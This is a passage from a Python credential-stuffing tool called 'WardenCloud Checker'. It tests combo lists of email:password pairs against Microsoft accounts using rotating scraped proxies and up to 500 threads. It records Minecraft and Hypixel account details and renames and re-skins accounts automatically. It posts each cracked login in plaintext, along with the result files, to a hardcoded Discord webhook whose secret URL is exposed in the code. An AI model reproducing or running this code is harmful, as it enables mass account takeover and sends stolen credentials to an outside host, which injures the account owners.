        "avatar_url": "https://cdn.discordapp.com/attachments/1432266513678864405/1434196556969545910/image.png?ex=69077321&is=690621a1&hm=be548b70db7705df64ca51ac5d78a079da01829b6aa58ad58b6b2797dc2bf7ef",
        "embeds": [
            {
                "title": "🎉 WardenCloud Checking Summary 🎉",
                "color": 0x00FF00,  # Green color
                "fields": [
                    {"name": "<a:stats:1431893279460298833> Total Checked", "value": str(len(Combos)), "inline": True},
                    {"name": "<a:tick:1434239379517472948> Hits", "value": str(hits), "inline": True},
                    {"name": "<a:Wrong:1428669341838217216> Bad", "value": str(bad), "inline": True},
                    {"name": "<a:mcfa:1428618730916810832> SFA", "value": str(sfa), "inline": True},
                    {"name": "<a:mcfa:1428618730916810832> MFA", "value": str(mfa), "inline": True},
                    {"name": "<a:Warningggg:1434239818669490378> 2FA", "value": str(twofa), "inline": True},
                    {"name": "<a:xbox:1416742414676262933> Xbox Game Pass", "value": str(xgp), "inline": True},
                    {"name": "<a:xbox:1416742414676262933> Xbox Game Pass Ultimate", "value": str(xgpu), "inline": True},
                    {"name": "<a:mcfa:1428618730916810832> Other", "value": str(other), "inline": True},
                    {"name": "<a:mail:1433704383685726248> Valid Mail", "value": str(vm), "inline": True},
                    {"name": "<a:System:1429773195602563174> Retries", "value": str(retries), "inline": True},
                    {"name": "<a:Warningggg:1434239818669490378> Errors", "value": str(errors), "inline": True}
                ],
                "footer": {
                    "text": "WardenCloud Checker 🌟 Made with ❤️",
                    "icon_url": "https://cdn.discordapp.com/attachments/1432266513678864405/1434196556969545910/image.png?ex=69077321&is=690621a1&hm=be548b70db7705df64ca51ac5d78a079da01829b6aa58ad58b6b2797dc2bf7efs"
                },
                "timestamp": datetime.now(timezone.utc).isoformat()  # Add timestamp for when the embed was sent
            }
        ]
    }
    
    # Send summary embed
    try:
        requests.post(webhook_url, json=summary_payload, headers={"Content-Type": "application/json"})
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"Failed to send summary to Discord: {str(e)}")
    exclude_files = {"Valid_Mail.txt", "Codes.txt", "Capture.txt", "2fa.txt", "Payment.txt", "Banned.txt", "Normal.txt", "SFA.txt"}

    # Upload result files
    result_dir = f"results/{fname}"
    if os.path.exists(result_dir):
        for root, dirs, files in os.walk(result_dir):
            for file_name in files:
                if file_name.endswith(".txt") and file_name not in exclude_files:
                    file_path = os.path.join(root, file_name)
                    try:
                        with open(file_path, 'rb') as f:
                            files = {'file': (file_name, f)}
                            payload = {
                                "username": "WardenCloud Restocker",
                                "content": f"📤 Uploading result file: **{file_name}**"
                            }
                            requests.post(webhook_url, data=payload, files=files)
                    except Exception as e:
                        print(Fore.LIGHTRED_EX + f"Failed to upload {file_name}: {str(e)}")

    
    repr(readchar.readkey())
    os.abort()

def getproxy():
    if proxytype == "'5'": return random.choice(proxylist)
    if proxytype != "'4'": 
        proxy = random.choice(proxylist)
        if proxytype  == "'1'": return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        elif proxytype  == "'2'": return {'http': 'socks4://'+proxy,'https': 'socks4://'+proxy}
        elif proxytype  == "'3'": return {'http': 'socks5://'+proxy,'https': 'socks5://'+proxy}
    else: return None

def Checker(combo):
    global bad, checked, cpm
    try:
        split = combo.strip().split(":")
        email = split[0]
        password = split[1]
        if email != "" and password != "":
            authenticate(str(email), str(password))
        else:
            if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
            bad+=1
            cpm+=1
            checked+=1
    except:
        if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
        bad+=1
        cpm+=1
        checked+=1

def loadconfig():
    global maxretries, config

    def str_to_bool(value):
        return value.lower() in ('yes', 'true', 't', '1')

    default_config = {
        'Settings': {
            'Webhook': 'https://discord.com/api/webhooks/1426435835045085214/IfMYZnxopR5aVpBjHAsIUdqM0L9jlUdV4jGg9eMsPUtJzvp4qpGMJdNZDeKeGmb5E-IU',
            'Embed': True,
            'Max Retries': 5,
            'Proxyless Ban Check': False,
            'Use Different Proxies To Ban Check': False,
            'WebhookMessage': '''@everyone HIT: ||`<email>:<password>`||
Name: <name>
Account Type: <type>
Hypixel: <hypixel>
Hypixel Level: <level>
First Hypixel Login: <firstlogin>
Last Hypixel Login: <lastlogin>
Optifine Cape: <ofcape>
MC Capes: <capes>
Email Access: <access>
Hypixel Skyblock Coins: <skyblockcoins>
Hypixel Bedwars Stars: <bedwarsstars>
Banned: <banned>
Can Change Name: <namechange>
Last Name Change: <lastchanged>'''
        },
        'Scraper': {
            'Auto Scrape Minutes': 5
        },
        'Auto': {
            'Set Name': True,
            'Name': 'Wardencloud',
            'Set Skin': True,
            'Skin': 'https://s.namemc.com/i/bc8429d1f2e15539.png',
            'Skin Variant': 'classic'
        },
        'Captures': {
            'Hypixel Name': True,
            'Hypixel Level': True,
            'First Hypixel Login': True,
            'Last Hypixel Login': True,
            'Optifine Cape': True,
            'Minecraft Capes': True,
            'Email Access': True,
            'Hypixel Skyblock Coins': True,
            'Hypixel Bedwars Stars': True,
            'Hypixel Ban': True,
            'Name Change Availability': True,
            'Last Name Change': True,
            'Payment': True
        }
    }
    if not os.path.isfile("config.ini"):
        c = configparser.ConfigParser(allow_no_value=True)
        for section, values in default_config.items():
            c[section] = values
        with open('config.ini', 'w') as configfile:
            c.write(configfile)
    read_config = configparser.ConfigParser()
    read_config.read('config.ini')
    config_updated = False
    for section, values in default_config.items():
        if section not in read_config:
            read_config[section] = values
            config_updated = True
        else:
            for key, value in values.items():
                if key not in read_config[section]:
                    read_config[section][key] = str(value)
                    config_updated = True
    if config_updated:
        with open('config.ini', 'w') as configfile:
            read_config.write(configfile)
    # settings
    maxretries = int(read_config['Settings']['Max Retries'])
    config.set('webhook', str(read_config['Settings']['Webhook']))
    config.set('embed', str_to_bool(read_config['Settings']['Embed']))
    config.set('message', str(read_config['Settings']['WebhookMessage']))
    config.set('proxylessban', str_to_bool(read_config['Settings']['Proxyless Ban Check']))
    config.set('differentproxy', str_to_bool(read_config['Settings']['Use Different Proxies To Ban Check']))
    # scraper
    config.set('autoscrape', int(read_config['Scraper']['Auto Scrape Minutes']))
    # auto
    config.set('setname', str_to_bool(read_config['Auto']['Set Name']))
    config.set('name', str(read_config['Auto']['Name']))
    config.set('setskin', str_to_bool(read_config['Auto']['Set Skin']))
    config.set('skin', str(read_config['Auto']['Skin']))
    config.set('variant', str(read_config['Auto']['Skin Variant']))
    # capture
    config.set('hypixelname', str_to_bool(read_config['Captures']['Hypixel Name']))
    config.set('hypixellevel', str_to_bool(read_config['Captures']['Hypixel Level']))
    config.set('hypixelfirstlogin', str_to_bool(read_config['Captures']['First Hypixel Login']))
    config.set('hypixellastlogin', str_to_bool(read_config['Captures']['Last Hypixel Login']))
    config.set('optifinecape', str_to_bool(read_config['Captures']['Optifine Cape']))
    config.set('mcapes', str_to_bool(read_config['Captures']['Minecraft Capes']))
    config.set('access', str_to_bool(read_config['Captures']['Email Access']))
    config.set('hypixelsbcoins', str_to_bool(read_config['Captures']['Hypixel Skyblock Coins']))
    config.set('hypixelbwstars', str_to_bool(read_config['Captures']['Hypixel Bedwars Stars']))
    config.set('hypixelban', str_to_bool(read_config['Captures']['Hypixel Ban']))
    config.set('namechange', str_to_bool(read_config['Captures']['Name Change Availability']))
    config.set('lastchanged', str_to_bool(read_config['Captures']['Last Name Change']))
    config.set('payment', str_to_bool(read_config['Captures']['Payment']))

def get_proxies():
    global proxylist
    http = []
    socks4 = []
    socks5 = []
    api_http = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt" #JUST SO YOU KNOW YOU CANNOT PUT ANY PAGE WITH PROXIES HERE UNLESS ITS JUST PROXIES ON THE PAGE, TO SEE WHAT I MEAN VISIT THE WEBSITES
    ]
    api_socks4 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt" #JUST SO YOU KNOW YOU CANNOT PUT ANY PAGE WITH PROXIES HERE UNLESS ITS JUST PROXIES ON THE PAGE, TO SEE WHAT I MEAN VISIT THE WEBSITES
    ]
    api_socks5 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt" #JUST SO YOU KNOW YOU CANNOT PUT ANY PAGE WITH PROXIES HERE UNLESS ITS JUST PROXIES ON THE PAGE, TO SEE WHAT I MEAN VISIT THE WEBSITES
    ]
    for service in api_http:
        http.extend(requests.get(service).text.splitlines())
    for service in api_socks4: 
        socks4.extend(requests.get(service).text.splitlines())
    for service in api_socks5: 
        socks5.extend(requests.get(service).text.splitlines())
    try:
        for dta in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks4&limit=500").json().get('data'):
            socks4.append(f"{dta.get('ip')}:{dta.get('port')}")
    except: pass
    try:
        for dta in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500").json().get('data'):
            socks5.append(f"{dta.get('ip')}:{dta.get('port')}")
    except: pass
    http = list(set(http))
    socks4 = list(set(socks4))
    socks5 = list(set(socks5))
    proxylist.clear()
    for proxy in http: proxylist.append({'http': 'http://'+proxy, 'https': 'http://'+proxy})
    for proxy in socks4: proxylist.append({'http': 'socks4://'+proxy,'https': 'socks4://'+proxy})
    for proxy in socks5: proxylist.append({'http': 'socks5://'+proxy,'https': 'socks5://'+proxy})
    if screen == "'2'": print(Fore.LIGHTBLUE_EX+f'Scraped [{len(proxylist)}] proxies')
    time.sleep(config.get('autoscrape') * 60)
    get_proxies()

def banproxyload():
    global banproxies
    proxyfile = filedialog.askopenfile(mode='rb', title='Choose a SOCKS5 Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if proxyfile is None:
        print(Fore.LIGHTRED_EX+"Invalid File.")
        time.sleep(2)
        banproxies()
    else:
        try:
            with open(proxyfile.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        banproxies.append(proxyline)
                    except: pass
            print(Fore.LIGHTBLUE_EX+f"Loaded [{len(banproxies)}] lines.")
            time.sleep(2)
        except Exception:
            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
            time.sleep(2)
            banproxyload()

def Main():
    global proxytype, screen, banproxies
    utils.set_title("Warden Cloud Checker")

    # Load config
    try:
        loadconfig()
    except Exception as e:
        print(e)
        traceback.print_exc()
        line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
        print("Exception occurred at line:", line_number)
        print(Fore.RED + "There was an error loading the config. Delete old config and reopen MSMC.")
        input()
        exit()

    print(logo)

    # Threads Input
    print(f"{Fore.CYAN}┌─ {Fore.WHITE}{Style.BRIGHT}Thread Recommendations{Fore.CYAN} ─────────────────────────────────────────────────────┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│{Fore.YELLOW}  • Proxyless: 1-10 threads (avoid rate limits)                               {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│{Fore.YELLOW}  • With Proxies: 10-200 threads (depends on proxy quality)                   {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│{Fore.YELLOW}  • High Quality Proxies: 200-500 threads (premium proxies only)              {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
    print()
    try:
        thread = int(input(f"{Fore.GREEN}► {Fore.WHITE}Threads (1-500): {Style.RESET_ALL}"))
        if thread < 1 or thread > 500:
            print(Fore.RED + Style.BRIGHT + "Threads must be between 1 and 500." + Style.RESET_ALL)
            time.sleep(2)
            Main()
    except:
        print(Fore.RED + Style.BRIGHT + "Must be a valid number between 1-500." + Style.RESET_ALL)
        time.sleep(2)
        Main()

    print()

    # Proxy Type
    print(f"{Fore.CYAN}┌─ {Fore.WHITE}{Style.BRIGHT}Proxy Type{Fore.CYAN} ──────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.GREEN}[1]{Fore.WHITE} Http/s  {Fore.CYAN}│  {Fore.GREEN}[2]{Fore.WHITE} Socks4  {Fore.CYAN}│  {Fore.GREEN}[3]{Fore.WHITE} Socks5  {Fore.CYAN}│  {Fore.GREEN}[4]{Fore.WHITE} None  {Fore.CYAN}│  {Fore.GREEN}[5]{Fore.WHITE} Auto Scraper  {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
    proxytype = repr(readchar.readkey())
    try:
        cleaned = int(proxytype.replace("'", ""))
    except:
        print(Fore.RED + "Invalid proxy type input")
        return Main()

    # Screen mode
    print()
    print(f"{Fore.CYAN}┌─ {Fore.WHITE}{Style.BRIGHT}Screen Mode{Fore.CYAN} ──────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.GREEN}[1]{Fore.WHITE} CUI (Compact)  {Fore.CYAN}│  {Fore.GREEN}[2]{Fore.WHITE} Log (Detailed)                                  {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
    screen = repr(readchar.readkey())

    # Load combos
    print()
    print(f"{Fore.GREEN}► SELECT COMBO FILE: {Fore.WHITE}Choose your combo file...{Style.RESET_ALL}")
    Load()

    # Load proxies if NOT proxyless or auto scraper
    if proxytype not in ("'4'", "'5'"):
        print(Fore.GREEN + Style.BRIGHT + "► SELECT PROXIES FILE: Choose your proxy file..." + Style.RESET_ALL)
        Proxys()

    # Ban checking proxies
    if config.get('proxylessban') is False and config.get('hypixelban') is True:
        if config.get('differentproxy'):
            print(Fore.LIGHTBLUE_EX + "Select your SOCKS5 Ban Checking Proxies.")
            banproxyload()
        else:
            banproxies.extend(proxylist)

    # Auto Scraper
    if proxytype == "'5'":
        print(Fore.LIGHTGREEN_EX + "Scraping Proxies Please Wait.")
        threading.Thread(target=get_proxies).start()
        while len(proxylist) == 0:
            time.sleep(1)

    if proxytype == "'4'" and thread >= 20:
        print()
        print(f"{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════════╗")
        print(f"║{Fore.YELLOW}{Style.BRIGHT}                              ⚠️  CRITICAL WARNING ⚠️                              {Fore.RED}║")
        print(f"╠══════════════════════════════════════════════════════════════════════════════════╣{Style.RESET_ALL}")
        print(f"{Fore.RED}║ {Fore.WHITE}You are about to use {Fore.YELLOW}{Style.BRIGHT}{thread} threads{Fore.WHITE} in {Fore.YELLOW}{Style.BRIGHT}PROXYLESS MODE{Fore.WHITE}                           {Fore.RED}║{Style.RESET_ALL}")
        print(f"{Fore.RED}║                                                                                  ║{Style.RESET_ALL}")
        print(f"{Fore.RED}║ {Fore.YELLOW}This configuration is EXTREMELY RISKY and may cause:{Fore.WHITE}                         {Fore.RED}║{Style.RESET_ALL}")
        print(f"{Fore.RED}║   {Fore.RED}• IP Rate Limiting / Temporary Bans{Fore.WHITE}                                         {Fore.RED}║{Style.RESET_ALL}")
        print(f"{Fore.RED}║   {Fore.RED}• Microsoft Account Lockouts{Fore.WHITE}                                                {Fore.RED}║{Style.RESET_ALL}")
        print(f"{Fore.RED}║   {Fore.RED}• Connection Failures & Errors{Fore.WHITE}                                              {Fore.RED}║{Style.RESET_ALL}")
        print(f"{Fore.RED}║   {Fore.RED}• Inaccurate Results{Fore.WHITE}                                                        {Fore.RED}║{Style.RESET_ALL}")
        print(f"{Fore.RED}║                                                                                  ║{Style.RESET_ALL}")
        print(f"{Fore.RED}║ {Fore.GREEN}Recommended Options:{Fore.WHITE}                                                         {Fore.RED}║{Style.RESET_ALL}")
        print(f"{Fore.RED}║   {Fore.GREEN}✓ Use proxies (Option 1-3 or 5){Fore.WHITE}                                           {Fore.RED}║{Style.RESET_ALL}")
        print(f"{Fore.RED}║   {Fore.GREEN}✓ Reduce threads to 5-10 for proxyless{Fore.WHITE}                                    {Fore.RED}║{Style.RESET_ALL}")
        print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        print()
        confirm = input(f"{Fore.RED}{Style.BRIGHT}Are you ABSOLUTELY SURE you want to continue with {thread} threads? (yes/no): {Style.RESET_ALL}")
        if confirm.lower() not in ['yes', 'y']:
            print(f"{Fore.CYAN}Returning to configuration...{Style.RESET_ALL}")
            time.sleep(1)
            Main()
    elif proxytype == "'4'" and thread > 10:
        print(Fore.YELLOW + Style.BRIGHT + f"⚠️  WARNING: Using {thread} threads without proxies may cause rate limiting!" + Style.RESET_ALL)
        print(Fore.YELLOW + "Recommended: Use proxies or reduce threads to 5-10 for proxyless mode." + Style.RESET_ALL)
        confirm = input(Fore.RED + "Continue anyway? (y/n): " + Style.RESET_ALL)
        if confirm.lower() != 'y':
            Main()

    # Create results folders (Linux safe)
    if not os.path.exists("results"):
        os.makedirs("results", exist_ok=True)
    if not os.path.exists(f"results/{fname}"):
        os.makedirs(f"results/{fname}", exist_ok=True)

    # Screen selection
    if screen == "'1'":
        cuiscreen()
    elif screen == "'2'":
        logscreen()
    else:
        cuiscreen()

    # Thread executor
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
        futures = [executor.submit(Checker, combo) for combo in Combos]
        concurrent.futures.wait(futures)

    finishedscreen()
    input()
Main()
